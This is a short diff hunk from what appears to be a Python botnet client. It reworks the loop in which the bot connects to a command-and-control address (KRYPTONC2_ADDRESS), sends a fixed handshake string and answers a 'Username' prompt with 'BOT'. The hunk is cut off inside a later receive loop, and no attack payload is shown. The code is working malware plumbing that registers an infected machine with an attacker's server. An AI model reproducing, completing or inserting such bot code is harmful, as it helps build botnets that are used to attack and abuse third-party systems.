@@ -400,14 +400,14 @@ def main():
         try:
             c2.connect((KRYPTONC2_ADDRESS, KRYPTONC2_PORT))
             while 1:
-                    c2.send('669787761736865726500'.encode())
+                c2.send('669787761736865726500'.encode())
+                break
+            while 1:
+                time.sleep(1)
+                data = c2.recv(1024).decode()
+                if 'Username' in data:
+                    c2.send('BOT'.encode())
                     break
-                while 1:
-                    time.sleep(1)
-                    data = c2.recv(1024).decode()
-                    if 'Username' in data:
-                        c2.send('BOT'.encode())
-                        break
                 while 1:
                     time.sleep(1)
                     data = c2.recv(1024).decode()
